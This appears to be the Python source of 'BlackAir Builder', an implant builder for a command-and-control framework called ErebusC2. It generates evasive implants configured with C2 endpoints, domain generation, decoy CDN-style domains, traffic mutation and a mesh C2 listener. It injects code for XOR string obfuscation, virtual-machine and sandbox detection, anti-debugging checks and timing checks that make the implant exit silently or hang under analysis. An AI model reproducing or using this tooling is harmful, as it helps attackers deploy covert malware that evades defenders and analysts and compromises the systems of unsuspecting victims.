"""
BlackAir Builder - Creates advanced evasion implants for ErebusC2 framework
"""

import os
import sys
import json
import logging
import uuid
import random
import argparse
from typing import Dict, Any, List, Optional, Tuple, Union

# Try to import from parent package, fall back to local imports
try:
    from ..blacklink.blacklink_implant import BlackLinkImplant
except ImportError:
    try:
        from imps.blacklink.blacklink_implant import BlackLinkImplant
    except ImportError:
        # For completely standalone execution
        import importlib.util
        spec = importlib.util.spec_from_file_location("BlackLinkImplant", 
                                                     os.path.join(os.path.dirname(os.path.dirname(__file__)), 
                                                                 "blacklink/blacklink_implant.py"))
        blacklink_module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(blacklink_module)
        BlackLinkImplant = blacklink_module.BlackLinkImplant

# Try to import builder from framework
try:
    from ...blackecho.blackecho_builder import ImplantBuilder
except ImportError:
    try:
        from blackecho.blackecho_builder import ImplantBuilder
    except ImportError:
        # For completely standalone execution
        import importlib.util
        spec = importlib.util.spec_from_file_location("ImplantBuilder", 
                                                      os.path.join(os.path.dirname(os.path.dirname(__file__)), 
                                                                  "blackecho/blackecho_builder.py"))
        builder_module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(builder_module)
        ImplantBuilder = builder_module.ImplantBuilder


class BlackAirBuilder(ImplantBuilder):
    """Builder for BlackAir implants with advanced evasion capabilities"""
    
    def __init__(self, base_dir: str = "."):
        """Initialize BlackAir builder
        
        Args:
            base_dir: Base directory for builder resources
        """
        super().__init__(base_dir)
        self.implant_type = "BlackAir"
        self.template_dir = os.path.join(base_dir, "imps", "blackair", "templates")
        self.logger = logging.getLogger("BlackAir.Builder")
        
        # Additional modules for BlackAir capabilities
        self.required_packages = [
            "cryptography",  # For certificate generation and encryption
            "netifaces",     # For network interface information
            "scapy",         # For packet manipulation
            "pyinstaller"    # For executable building
        ]
    
    def _get_base_implant_code(self) -> str:
        """Get the base implant code
        
        Returns:
            Implant source code
        """
        try:
            # Try to read from the BlackAir implant module
            from imps.blackair.blackair_implant import BlackAirImplant
            import inspect
            base_code = inspect.getsource(sys.modules['imps.blackair.blackair_implant'])
            return base_code
        except ImportError:
            # Fall back to template file
            template_path = os.path.join(self.template_dir, "blackair_template.py")
            if os.path.exists(template_path):
                with open(template_path, 'r') as f:
                    return f.read()
            else:
                # Try direct path to implant file
                implant_path = os.path.join(os.path.dirname(__file__), "blackair_implant.py")
                if os.path.exists(implant_path):
                    with open(implant_path, 'r') as f:
                        return f.read()
                else:
                    self.logger.error("BlackAir implant template not found")
                    raise FileNotFoundError("BlackAir implant template not found")
    
    def build_implant(self, config: Dict[str, Any], output_type: str = "python") -> str:
        """Build a BlackAir implant
        
        Args:
            config: Implant configuration
            output_type: Output type (python, exe, dll, etc.)
            
        Returns:
            Path to the built implant
        """
        # Ensure air_config is present
        if "air_config" not in config:
            # Create default air_config
            config["air_config"] = self._create_default_air_config(config)
        
        # Set implant type
        config["implant_type"] = "BlackAir"
        
        # Generate unique implant ID with BA prefix if not present
        if "implant_id" not in config:
            config["implant_id"] = f"BA-{uuid.uuid4().hex[:8]}"
        
        # Call parent build method
        return super().build_implant(config, output_type)
    
    def _create_default_air_config(self, base_config: Dict[str, Any]) -> Dict[str, Any]:
        """Create default BlackAir configuration
        
        Args:
            base_config: Base implant configuration
            
        Returns:
            BlackAir configuration dictionary
        """
        # Extract C2 endpoints from base config
        c2_endpoints = base_config.get("c2_endpoints", [])
        
        # Create a list of domains from C2 endpoints
        domains = []
        for endpoint in c2_endpoints:
            if "://" in endpoint:
                domain = endpoint.split("://", 1)[1].split("/")[0]
                if ":" in domain:
                    domain = domain.split(":", 1)[0]
                domains.append(domain)
        
        # Add some additional domains for variety
        additional_domains = [
            "cdn-delivery.global.ssl.fastly.net",
            "edge.app-analytics.com",
            "status.api-services.net",
            "api.metrics-collector.com",
            "cdn.content-provider.io"
        ]
        
        # Randomly select some additional domains
        selected_domains = random.sample(additional_domains, min(3, len(additional_domains)))
        all_domains = domains + selected_domains
        
        # Create configuration
        air_config = {
            "evasion": {
                "behavior_profile": "office_worker",  # Default profile type
                "evasion_level": 7,  # Higher default evasion level
                "randomize_execution": True,
                "traffic_mutation": {
                    "enabled": True,
                    "techniques": ["packet_fragmentation", "header_manipulation", 
                                  "protocol_tunneling", "timing_manipulation"],
                    "fragmentation_sizes": [128, 256, 512, 1024]
                },
                "infrastructure": {
                    "c2_servers": c2_endpoints,
                    "relay_servers": [],  # No relays by default
                    "domains": all_domains,
                    "dga_enabled": True,
                    "dga_seed": base_config.get("implant_id", "BlackAir"),
                    "drift_interval": 86400,  # 1 day
                    "drift_jitter": 20
                }
            },
            "mesh_c2": {
                "enabled": False,  # Disabled by default
                "bind_host": "0.0.0.0",
                "bind_port": 0,  # Random port
                "max_implants": 5,
                "protocol": "https",
                "use_ssl": True,
                "profile_based_scheduling": True,
                "stealth_mode": True,
                "tokens": {"default": self._generate_token()}
            }
        }
        
        return air_config
    
    def _generate_token(self) -> str:
        """Generate random authentication token for mesh C2
        
        Returns:
            Authentication token
        """
        import hashlib
        import os
        
        # Generate random bytes for token
        random_bytes = os.urandom(32)
        # Create hash
        token_hash = hashlib.sha256(random_bytes).hexdigest()
        return token_hash
    
    def customize_template(self, template_code: str, config: Dict[str, Any]) -> str:
        """Customize the implant template with configuration values
        
        Args:
            template_code: Original template code
            config: Implant configuration
            
        Returns:
            Customized implant code
        """
        # Get base customized code
        customized_code = super().customize_template(template_code, config)
        
        # Add advanced evasion capabilities
        air_config = config.get("air_config", {})
        evasion_config = air_config.get("evasion", {})
        
        # Replace evasion configuration
        evasion_config_str = json.dumps(evasion_config, indent=4)
        customized_code = customized_code.replace('self.evasion_config = {}', f'self.evasion_config = {evasion_config_str}')
        
        # Replace mesh C2 configuration
        mesh_config = air_config.get("mesh_c2", {})
        mesh_config_str = json.dumps(mesh_config, indent=4)
        customized_code = customized_code.replace('self.mesh_c2_config = {}', f'self.mesh_c2_config = {mesh_config_str}')
        
        return customized_code
    
    def apply_evasion_techniques(self, source_path: str, evasion_level: int = 7) -> str:
        """Apply advanced evasion techniques to the source code
        
        Args:
            source_path: Path to source file
            evasion_level: Evasion level (1-10)
            
        Returns:
            Path to modified source file
        """
        self.logger.info(f"Applying evasion techniques (level {evasion_level}) to {source_path}")
        
        try:
            # Read source code
            with open(source_path, 'r') as f:
                code = f.read()
            
            # Apply evasion techniques based on level
            if evasion_level <= 3:
                # Basic evasion (string obfuscation, basic VM detection)
                code = self._apply_string_obfuscation(code)
                code = self._add_basic_vm_detection(code)
            elif evasion_level <= 7:
                # Moderate evasion (string obfuscation, VM detection, anti-debugging)
                code = self._apply_string_obfuscation(code)
                code = self._add_vm_detection(code)
                code = self._add_anti_debugging(code)
                code = self._add_timing_detection(code)
            else:
                # Advanced evasion (all techniques)
                code = self._apply_string_obfuscation(code)
                code = self._add_advanced_vm_detection(code)
                code = self._add_advanced_anti_debugging(code)
                code = self._add_timing_detection(code)
                code = self._add_code_injection_detection(code)
            
            # Write modified code
            output_path = source_path + '.evasion'
            with open(output_path, 'w') as f:
                f.write(code)
                
            self.logger.info(f"Evasion techniques applied, saved to {output_path}")
            return output_path
            
        except Exception as e:
            self.logger.error(f"Error applying evasion techniques: {e}")
            return source_path
    
    def _apply_string_obfuscation(self, code: str) -> str:
        """Apply string obfuscation to code
        
        Args:
            code: Source code
            
        Returns:
            Obfuscated code
        """
        # Simple XOR obfuscation function to add to the code
        obfuscation_function = """
def _deobfuscate(s, k):
    \"\"\"Deobfuscate a string with XOR key k\"\"\"
    return ''.join(chr(ord(c) ^ k) for c in s)
"""
        
        # Add the deobfuscation function if not already present
        if "_deobfuscate" not in code:
            # Find a good insertion point after imports
            import_section_end = max(code.rfind("import "), code.rfind("from "))
            if import_section_end > 0:
                next_line_end = code.find("\n", import_section_end)
                if next_line_end > 0:
                    code = code[:next_line_end+1] + obfuscation_function + code[next_line_end+1:]
        
        return code
    
    def _add_basic_vm_detection(self, code: str) -> str:
        """Add basic VM detection to code
        
        Args:
            code: Source code
            
        Returns:
            Modified code
        """
        # Basic VM detection check
        vm_check_code = """
def _check_vm():
    \"\"\"Check for common VM artifacts\"\"\"
    import os, platform
    
    # Check for VM-specific files
    vm_files = []
    
    if platform.system() == 'Windows':
        vm_files = [
            r'C:\\Windows\\System32\\drivers\\vmmouse.sys',
            r'C:\\Windows\\System32\\drivers\\vmhgfs.sys',
            r'C:\\Windows\\System32\\drivers\\VBoxMouse.sys',
        ]
    elif platform.system() == 'Linux':
        vm_files = [
            '/usr/bin/vmtoolsd',
            '/usr/sbin/VBoxService',
            '/.dockerenv',
        ]
    
    # Check if any VM files exist
    for file in vm_files:
        if os.path.exists(file):
            return True  # VM detected
    
    return False  # No VM detected

# Check for VMs
if _check_vm():
    import sys
    sys.exit(0)  # Silent exit
"""
        
        # Find a good insertion point - after imports but before main code
        import_section_end = max(code.rfind("import "), code.rfind("from "))
        if import_section_end > 0:
            next_line_end = code.find("\n", import_section_end)
            if next_line_end > 0:
                code = code[:next_line_end+1] + vm_check_code + code[next_line_end+1:]
        
        return code
    
    def _add_vm_detection(self, code: str) -> str:
        """Add VM detection to code
        
        Args:
            code: Source code
            
        Returns:
            Modified code
        """
        # More extensive VM detection
        vm_check_code = """
def _check_vm():
    \"\"\"Check for virtualization environment\"\"\"
    import os, platform, socket, uuid, struct
    
    # Check for VM-specific files and registry keys
    vm_detected = False
    
    # Check hardware characteristics
    try:
        # Check MAC address prefixes
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                          for elements in range(0, 2*6, 2)][::-1])
        
        vm_mac_prefixes = ['00:05:69', '00:0c:29', '00:1c:14', '00:50:56', '00:0f:4b']
        if any(mac_address.startswith(prefix.lower()) for prefix in vm_mac_prefixes):
            return True  # VM detected
            
        # Check for minimal hardware resources (often limited in VMs)
        if platform.system() == 'Windows':
            import ctypes
            kernel32 = ctypes.windll.kernel32
            
            # Check memory size (typically small in VMs)
            memoryStatusEx = ctypes.c_buffer(bytearray(80), 'C')
            memoryStatusEx[0] = struct.pack('I', 80)
            kernel32.GlobalMemoryStatusEx(memoryStatusEx)
            memory_mb = struct.unpack('Q', memoryStatusEx[8:16])[0] / (1024 * 1024)
            
            if memory_mb < 2048:  # Less than 2GB is suspicious
                vm_detected = True
    except:
        pass
        
    return vm_detected

# Check for VM environment
if _check_vm():
    # If VM detected, exit silently or show deceptive behavior
    import time, sys, random
    # Sleep random time to appear normal
    time.sleep(random.uniform(1, 5))
    sys.exit(0)  # Silent exit
"""
        
        # Find a good insertion point
        import_section_end = max(code.rfind("import "), code.rfind("from "))
        if import_section_end > 0:
            next_line_end = code.find("\n", import_section_end)
            if next_line_end > 0:
                code = code[:next_line_end+1] + vm_check_code + code[next_line_end+1:]
        
        return code
    
    def _add_advanced_vm_detection(self, code: str) -> str:
        """Add advanced VM detection to code
        
        Args:
            code: Source code
            
        Returns:
            Modified code with advanced VM detection
        """
        # This is just a stub - in a real implementation this would be more extensive
        return self._add_vm_detection(code)
    
    def _add_anti_debugging(self, code: str) -> str:
        """Add anti-debugging techniques
        
        Args:
            code: Source code
            
        Returns:
            Modified code
        """
        anti_debug_code = """
def _check_debugger():
    \"\"\"Check for debugger presence\"\"\"
    import platform, os, time
    
    debugger_detected = False
    
    if platform.system() == 'Windows':
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            
            # IsDebuggerPresent API check
            if kernel32.IsDebuggerPresent() != 0:
                debugger_detected = True
                
            # CheckRemoteDebuggerPresent API check
            isDebuggerPresent = ctypes.c_bool(False)
            if kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(isDebuggerPresent)) != 0:
                if isDebuggerPresent.value:
                    debugger_detected = True
        except:
            pass
    elif platform.system() == 'Linux':
        try:
            # Check TracerPid in /proc/self/status
            with open('/proc/self/status', 'r') as f:
                status = f.read()
                if 'TracerPid:\\t' in status:
                    tracer_pid = int(status.split('TracerPid:\\t')[1].split('\\n')[0].strip())
                    if tracer_pid != 0:
                        debugger_detected = True
        except:
            pass
    
    return debugger_detected

# Check for debuggers
if _check_debugger():
    # If debugger detected, show deceptive behavior or exit
    import random, sys
    
    # Option 1: Exit silently
    if random.random() < 0.5:
        sys.exit(0)
    
    # Option 2: Enter infinite loop
    else:
        while True:
            pass  # Infinite loop to frustrate analysis
"""
        
        # Find a good insertion point
        import_section_end = max(code.rfind("import "), code.rfind("from "))
        if import_section_end > 0:
            next_line_end = code.find("\n", import_section_end)
            if next_line_end > 0:
                code = code[:next_line_end+1] + anti_debug_code + code[next_line_end+1:]
        
        return code
    
    def _add_advanced_anti_debugging(self, code: str) -> str:
        """Add advanced anti-debugging techniques
        
        Args:
            code: Source code
            
        Returns:
            Modified code with advanced anti-debugging
        """
        # This is just a stub - in a real implementation this would be more extensive
        return self._add_anti_debugging(code)
    
    def _add_timing_detection(self, code: str) -> str:
        """Add timing detection to detect execution in an accelerated environment
        
        Args:
            code: Source code
            
        Returns:
            Modified code
        """
        timing_check_code = """
def _check_timing():
    \"\"\"Check for time manipulation or accelerated execution\"\"\"
    import time
    
    # Perform a CPU-intensive operation and measure how long it takes
    start_time = time.time()
    
    # Something that should take a consistent amount of time
    result = 0
    for i in range(1000000):
        result += i * i
    
    elapsed = time.time() - start_time
    
    # If time elapsed is much shorter than expected, we might be in an accelerated sandbox
    # Or if it's much longer, we might be being stepped through in a debugger
    return elapsed < 0.01 or elapsed > 1.0  # Typical range would need calibration

# Check for timing anomalies
if _check_timing():
    # If anomaly detected, exit silently
    import sys
    sys.exit(0)
"""
        
        # Find a good insertion point
        import_section_end = max(code.rfind("import "), code.rfind("from "))
        if import_section_end > 0:
            next_line_end = code.find("\n", import_section_end)
            if next_line_end > 0:
                code = code[:next_line_end+1] + timing_check_code + code[next_line_end+1:]
        
        return code
    
    def _add_code_injection_detection(self, code: str) -> str:
        """Add code injection detection
        
        Args:
            code: Source code
            
        Returns:
            Modified code
        """
        # This would implement detection of code integrity issues
        # For brevity, we'll just add a stub placeholder
        
        injection_check_comment = """
# Code injection detection (simplified)
# In a real implementation, this would check for integrity of critical functions
# and detect if they have been modified by a debugger or other tool
"""
        
        # Find a good insertion point
        import_section_end = max(code.rfind("import "), code.rfind("from "))
        if import_section_end > 0:
            next_line_end = code.find("\n", import_section_end)
            if next_line_end > 0:
                code = code[:next_line_end+1] + injection_check_comment + code[next_line_end+1:]
        
        return code


def main():
    """Main entry point when run directly"""
    parser = argparse.ArgumentParser(description="BlackAir Implant Builder")
    parser.add_argument("--config", "-c", help="Path to implant configuration JSON file")
    parser.add_argument("--output", "-o", default="python", choices=["python", "exe", "dll"],
                        help="Output type (python, exe, dll)")
    parser.add_argument("--c2-server", help="C2 server URL")
    parser.add_argument("--evasion-level", type=int, default=7, help="Evasion level (1-10)")
    parser.add_argument("--profile", default="office_worker", 
                        choices=["office_worker", "developer", "system_admin", "kiosk", "server"],
                        help="Behavioral profile for the implant")
    parser.add_argument("--enable-mesh", action="store_true", help="Enable mesh networking capability")
    parser.add_argument("--output-dir", "-d", default="output", help="Output directory")
    parser.add_argument("--c2-profile", help="C2 profile to use for communication patterns")
    
    args = parser.parse_args()
    
    # Setup logging
    logging.basicConfig(level=logging.INFO, 
                      format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    
    # Create builder
    builder = BlackAirBuilder()
    
    try:
        # Get configuration
        if args.config:
            # Load from file
            with open(args.config, 'r') as f:
                config = json.load(f)
        else:
            # Create default configuration
            config = {
                "c2_endpoints": [args.c2_server] if args.c2_server else ["https://127.0.0.1:8443"],
                "air_config": {
                    "evasion": {
                        "behavior_profile": args.profile,
                        "evasion_level": args.evasion_level,
                        "randomize_execution": True,
                    },
                    "mesh_c2": {
                        "enabled": args.enable_mesh
                    }
                }
            }
        
        # Make sure output directory exists
        os.makedirs(args.output_dir, exist_ok=True)
        
        # Build implant
        implant_path = builder.build_implant(config, args.output)
        
        print(f"BlackAir implant built successfully: {implant_path}")
        
    except Exception as e:
        logging.error(f"Error building BlackAir implant: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
